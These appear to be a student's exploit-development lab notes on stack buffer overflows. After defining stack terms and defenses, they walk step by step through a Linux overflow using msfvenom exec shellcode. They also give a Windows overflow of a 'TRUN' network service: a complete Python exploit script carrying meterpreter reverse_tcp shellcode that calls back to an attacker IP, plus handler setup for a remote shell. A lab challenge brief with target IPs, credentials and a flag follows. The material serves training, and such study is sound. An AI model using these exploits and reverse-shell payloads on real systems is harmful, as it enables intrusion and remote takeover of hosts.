

--------------------------------------------------------------------------------------[Exploit Development Linux]--------------------------------------------------------------------------------------


[Buffer Overflow Common Terms]
HEAP				Memory that can be allocated and deallocated

STACK				A contiguous section of memory used for passing arguments

REGISTERS			Storage elements as close as possible to the central processing unit (CPU)

INSTRUCTION POINTER (IP)	a.k.a Program Counter (PC), contains the address of next instruction to be executed

STACK POINTER (SP)		Contains the address of the next available space on the stack

BASE POINTER (BP)		The base of the stack

FUNCTION			Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient

SHELLCODE			The code that is executed once an exploit successfully takes advantage of a vulnerability




[Buffer Overflow Defenses]
* Non executable (NX) stack

* Address Space Layout Randomization (ASLR)

* Data Execution Prevention (DEP)

* Stack Canaries

* Position Independent Executable (PIE)


[Technical Help]
Utilizing tools such as:

* IDA, GHIDRA

* GDB, MONA, IMMUNITY

* BASH, PYTHON


[GDB Uses]
Installation of Peda Plugin
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

[Common Commands]
disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point


[Staack Operational Terms]

Heap – memory that can be allocated and deallocated as needed.

Stack – a contiguous section of memory used for passing arguments to other functions and general housekeeping.

Registers – Storage elements as close as possible to the central processing unit (CPU). There are many uses and types of registers, but in simple terms, general purpose registers can be used for 
            whatever function is desired, that is fetching the contents of something from memory and placing it in the register for some computation/comparison, or special purpose registers such as 
            the Instruction Pointer (IP), or Stack Pointer (SP) which are discussed below.

Instruction Pointer (IP) – (AKA Program Counter (PC) contains the address of next instruction to be executed. When the instruction is executed, it increments to the next instruction unless the 
                           instruction transfers control to another location by replacing the contents of the IP with the address of the next command to be executed through the process of jumping, 
                           calling, or returning.

Stack Pointer (SP) – Contains the address of the next available space on the stack. The x86 architecture utilizes a top-down stack. When an item is saved on the stack (using a push command), it will 
                     be placed in the location addressed by the SP, after which, the SP will be decremented. When an item is fetched from the stack (using a pop instruction), the SP is decremented 
                     and then the item is retrieved from the address pointed to by the SP.

Base Pointer (BP) – The base of the stack. Used to ensure that items placed on the stack can be referenced using an offset relative to the BP. Because each function is provided a portion of the 
                    stack, it can be used to ensure that the function does not address items outside the bounds of their area on the stack. When there is nothing on the stack the BP will equal SP.

Function - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient. Functions can be written within the 
           program or can exist outside of the main program through the processing of linking (accessing code outside the main program). When a function allocates space for variables, those 
           variables are placed on the stack, so when the function completes and returns back to the calling function, access to those.

Shellcode – The code that is executed once an exploit successfully takes advantage of a vulnerability. Shellcode often provides a shell to the actor, but it doesn’t have to. Whatever the intended 
            effect is, is written in the shellcode.

The terms IP, BP, SP, etc are used in this document. Register names are different depending on the x86 architecture. IP, BP, SP are used for 16 bit. The register names are prefixed with the letter E’ for extended which signifies 32 bit architecture. The letter R’ for register prefixes register names for a 64 bit architecture.


------------------------------------------------------------------[Commands]------------------------------------------------------------------

https://wiremask.eu/tools/buffer-overflow-pattern-generator/

gdb <file>			- opens gdb with designated file

script:

buffer = "<wiremask pattern generator>"

eip = "BBBB"

nop = '\x90' * 5

print(buffer + eip + nop)


run <<< $(python lin_buf.py)




go to wiremask and get pattern
use pattern in script to find eip
put eip in find offset section on wiremask


buffer = "A" * <offset>

eip = "BBBB"

nop = '\x90' * 5

print(buffer + eip + nop)


run <<< $(python lin_buf.py)

eip should be 0x42424242

env - gdb func			- loads just gdb, not gdb-peta
show env
unset env LINES
unset env COLUMNS
show env
run				- when propted, overflow the buffer
info proc map
first address after heap to the botton of the stack
find /b 0xf7de1000 , 0xffffe000, 0xff, 0xe4
        first addr   last addr   |dont change these|

copy 5 or 6 of them
0xf7de3b59
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
0xf7f64aff

quit and go back to script

paste and comment out the results in the script and comment out eip
make a new eip and pick one of the comment out addresses ***MAKE SURE TO TYPE IT IN REVERSE***
0xf7f645fb --> \xfb\x45\xf6\xf7

buffer = "A" * 62

#eip = "BBBB"
#0xf7de3b59
#0xf7f588ab
#0xf7f645fb
#0xf7f6460f
#0xf7f64aeb
#0xf7f64aff

eip = "\xfb\x45\xf6\xf7"

nop = '\x90' * 5

print(buffer + eip + nop)

open msfconsole

msfconsole
use payload/linux/x86/exec
show options
set CMD whoami
show options 					- to confirm cmd is set
generate -b "\x00" -f python

copy what is showed

buf =  b""
buf += b"\xd9\xd0\xb8\x8e\x45\x7a\xb2\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x0b\x31\x43\x19\x03\x43\x19\x83\xc3"
buf += b"\x04\x6c\xb0\x10\xb9\x28\xa2\xb7\xdb\xa0\xf9\x54"
buf += b"\xad\xd7\x6a\xb4\xde\x7f\x6b\xa2\x0f\x1d\x02\x5c"
buf += b"\xd9\x02\x86\x48\xde\xc4\x27\x89\x96\xac\x48\xe8"
buf += b"\x35\x45\x97\xbd\x96\x1c\x76\x8c\x99"

put the thingy in the script

buffer = "A" * 62

#eip = "BBBB"
#0xf7de3b59
#0xf7f588ab
#0xf7f645fb
#0xf7f6460f
#0xf7f64aeb
#0xf7f64aff

eip = "\xfb\x45\xf6\xf7"

buf =  b""
buf += b"\xd9\xd0\xb8\x8e\x45\x7a\xb2\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x0b\x31\x43\x19\x03\x43\x19\x83\xc3"
buf += b"\x04\x6c\xb0\x10\xb9\x28\xa2\xb7\xdb\xa0\xf9\x54"
buf += b"\xad\xd7\x6a\xb4\xde\x7f\x6b\xa2\x0f\x1d\x02\x5c"
buf += b"\xd9\x02\x86\x48\xde\xc4\x27\x89\x96\xac\x48\xe8"
buf += b"\x35\x45\x97\xbd\x96\x1c\x76\x8c\x99"


nop = '\x90' * 5

print(buffer + eip + nop + buf)

run the program with exploit
sudo ./func <<< $(python lin_buf.py)



str cpy

stringcat
sprint


-------------------------------------------------------------------------------------[Exploit Development Windows]-------------------------------------------------------------------------------------


------------------------------------------------------------------[Commands]------------------------------------------------------------------


opem immunity debugger by dragging and dropping malware into it
run python script to cause a buffer overflow




!/usr/bin/python


import socket

buf = "TRUN /.:/"
buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad$

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.31.161", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()



copy eip and paste in wiremask to find offset
change script to offset

!/usr/bin/python


import socket

buf = "TRUN /.:/"
buf += "A" * 2003

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.31.161", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()



reopen and run immunity debugger and malware
once paused,run mona command


!mona jmp -r esp -m "essfunc.dll"

copy jump addresses
add new buf parameters

!/usr/bin/pythonEaglesIsARE78


import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xA0\x12\x50\x62"
buf += "\x90" * 10

#625012A0
#625012AD
#625012BA



s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.31.161", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()



generate shellcode in msfconsole

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.29.154 lport=4444 -b "\x00" -f python

***DONT COPY FIRST LINE***

buf += b"\xbd\x3d\x3a\x37\x4a\xda\xcd\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x59\x31\x6e\x14\x83\xee\xfc\x03\x6e"
buf += b"\x10\xdf\xcf\xcb\xa2\x90\x30\x34\x33\xce\xb9\xd1"
buf += b"\x02\xdc\xde\x92\x37\xd0\x95\xf7\xbb\x9b\xf8\xe3"
buf += b"\x48\xe9\xd4\x04\xf8\x47\x03\x2a\xf9\x66\x8b\xe0"
buf += b"\x39\xe9\x77\xfb\x6d\xc9\x46\x34\x60\x08\x8e\x82"
buf += b"\x0e\xe5\x42\x9e\xa3\xe9\xe9\xe2\x7f\x5e\xef\x32"
buf += b"\xf4\x20\x97\x37\xcb\xd4\x2b\x39\x1c\x44\x3f\x71"
buf += b"\x84\xef\x67\xa2\xb5\x3c\x12\x6b\xc1\xfe\x54\x5d"
buf += b"\xd5\x75\x52\x16\x28\x5f\xaa\xe8\xea\x90\xc0\x44"
buf += b"\xed\xe9\xe3\x74\x9b\x01\x10\x08\x9c\xd2\x6a\xd6"
buf += b"\x29\xc4\xcd\x9d\x8a\x20\xef\x72\x4c\xa3\xe3\x3f"
buf += b"\x1a\xeb\xe7\xbe\xcf\x80\x1c\x4a\xee\x46\x95\x08"
buf += b"\xd5\x42\xfd\xcb\x74\xd3\x5b\xbd\x89\x03\x03\x62"
buf += b"\x2c\x48\xa6\x75\x50\xb1\x38\x7a\x0c\x25\xf4\xb7"
buf += b"\xaf\xb5\x92\xc0\xdc\x87\x3d\x7b\x4b\xab\xb6\xa5"
buf += b"\x8c\xba\xd1\x55\x42\x04\xb1\xab\x63\x74\x9b\x6f"
buf += b"\x37\x24\xb3\x46\x38\xaf\x43\x66\xed\x45\x4e\xf0"
buf += b"\x04\xab\x53\x9a\x71\xc9\x6b\x8b\xdd\x44\x8d\xfb"
buf += b"\x8d\x06\x02\xbc\x7d\xe6\xf2\x54\x94\xe9\x2d\x44"
buf += b"\x97\x20\x46\xef\x78\x9c\x3e\x98\xe1\x85\xb5\x39"
buf += b"\xed\x10\xb0\x7a\x65\x90\x44\x34\x8e\xd1\x56\x21"
buf += b"\xe9\x19\xa7\xb2\x9c\x19\xcd\xb6\x36\x4e\x79\xb5"
buf += b"\x6f\xb8\x26\x46\x5a\xbb\x21\xb8\x1b\x8d\x5a\x8f"
buf += b"\x89\xb1\x34\xf0\x5d\x31\xc5\xa6\x37\x31\xad\x1e"
buf += b"\x6c\x62\xc8\x60\xb9\x17\x41\xf5\x42\x41\x35\x5e"
buf += b"\x2b\x6f\x60\xa8\xf4\x90\x47\xaa\xf3\x6e\x15\x85"
buf += b"\x5b\x06\xe5\x95\x5b\xd6\x8f\x15\x0c\xbe\x44\x39"
buf += b"\xa3\x0e\xa4\x90\xec\x06\x2f\x75\x5e\xb7\x30\x5c"
buf += b"\x3e\x69\x30\x53\x9b\x9a\x4b\x1c\x1c\x5b\xac\x34"
buf += b"\x79\x5c\xac\x38\x7f\x61\x7a\x01\xf5\xa4\xbe\x36"
buf += b"\x06\x93\xe3\x1f\x8d\xdb\xb0\x60\x84"


add it into the script


!/usr/bin/python


import socket

buf = "TRUN /.:/"
#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad$
buf += "A" * 2003
buf += "\xA0\x12\x50\x62"
buf += "\x90" * 10
buf += b"\xbd\x3d\x3a\x37\x4a\xda\xcd\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x59\x31\x6e\x14\x83\xee\xfc\x03\x6e"
buf += b"\x10\xdf\xcf\xcb\xa2\x90\x30\x34\x33\xce\xb9\xd1"
buf += b"\x02\xdc\xde\x92\x37\xd0\x95\xf7\xbb\x9b\xf8\xe3"
buf += b"\x48\xe9\xd4\x04\xf8\x47\x03\x2a\xf9\x66\x8b\xe0"
buf += b"\x39\xe9\x77\xfb\x6d\xc9\x46\x34\x60\x08\x8e\x82"
buf += b"\x0e\xe5\x42\x9e\xa3\xe9\xe9\xe2\x7f\x5e\xef\x32"
buf += b"\xf4\x20\x97\x37\xcb\xd4\x2b\x39\x1c\x44\x3f\x71"
buf += b"\x84\xef\x67\xa2\xb5\x3c\x12\x6b\xc1\xfe\x54\x5d"
buf += b"\xd5\x75\x52\x16\x28\x5f\xaa\xe8\xea\x90\xc0\x44"
buf += b"\xed\xe9\xe3\x74\x9b\x01\x10\x08\x9c\xd2\x6a\xd6"
buf += b"\x29\xc4\xcd\x9d\x8a\x20\xef\x72\x4c\xa3\xe3\x3f"
buf += b"\x1a\xeb\xe7\xbe\xcf\x80\x1c\x4a\xee\x46\x95\x08"
buf += b"\xd5\x42\xfd\xcb\x74\xd3\x5b\xbd\x89\x03\x03\x62"
buf += b"\x2c\x48\xa6\x75\x50\xb1\x38\x7a\x0c\x25\xf4\xb7"
buf += b"\xaf\xb5\x92\xc0\xdc\x87\x3d\x7b\x4b\xab\xb6\xa5"
buf += b"\x8c\xba\xd1\x55\x42\x04\xb1\xab\x63\x74\x9b\x6f"
buf += b"\x37\x24\xb3\x46\x38\xaf\x43\x66\xed\x45\x4e\xf0"
buf += b"\x04\xab\x53\x9a\x71\xc9\x6b\x8b\xdd\x44\x8d\xfb"
buf += b"\x8d\x06\x02\xbc\x7d\xe6\xf2\x54\x94\xe9\x2d\x44"
buf += b"\x97\x20\x46\xef\x78\x9c\x3e\x98\xe1\x85\xb5\x39"
buf += b"\xed\x10\xb0\x7a\x65\x90\x44\x34\x8e\xd1\x56\x21"
buf += b"\xe9\x19\xa7\xb2\x9c\x19\xcd\xb6\x36\x4e\x79\xb5"
buf += b"\x6f\xb8\x26\x46\x5a\xbb\x21\xb8\x1b\x8d\x5a\x8f"
buf += b"\x89\xb1\x34\xf0\x5d\x31\xc5\xa6\x37\x31\xad\x1e"
buf += b"\x6c\x62\xc8\x60\xb9\x17\x41\xf5\x42\x41\x35\x5e"
buf += b"\x2b\x6f\x60\xa8\xf4\x90\x47\xaa\xf3\x6e\x15\x85"
buf += b"\x5b\x06\xe5\x95\x5b\xd6\x8f\x15\x0c\xbe\x44\x39"
buf += b"\xa3\x0e\xa4\x90\xec\x06\x2f\x75\x5e\xb7\x30\x5c"
buf += b"\x3e\x69\x30\x53\x9b\x9a\x4b\x1c\x1c\x5b\xac\x34"
buf += b"\x79\x5c\xac\x38\x7f\x61\x7a\x01\xf5\xa4\xbe\x36"
buf += b"\x06\x93\xe3\x1f\x8d\xdb\xb0\x60\x84"

#625012A0
#625012AD
#625012BA


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.31.161", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()


create exploit in msfconsole

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.50.29.154
show options

close immunity debugger and malware
run malware
run python script
run msfconsole exploit
should get a meterpreter session
type shell and you should get a shell








-----------------------------------------------------------------------------------------------[Challenges]-------------------------------------------------------------------------------------------


Gorgas Exploit Development (GED)
XX Mar 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: DEVOPS

Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.

Tools/Techniques: Exploit binaries on target systems using the tools below.

Python
OllyDBG or an equivelent graphical program
http://www.ollydbg.de/
GNU Debugger's(GDB) Python Exploit Development Assistance Module
https://github.com/longld/peda
MetaSploit
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty

Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105
>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245
Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine










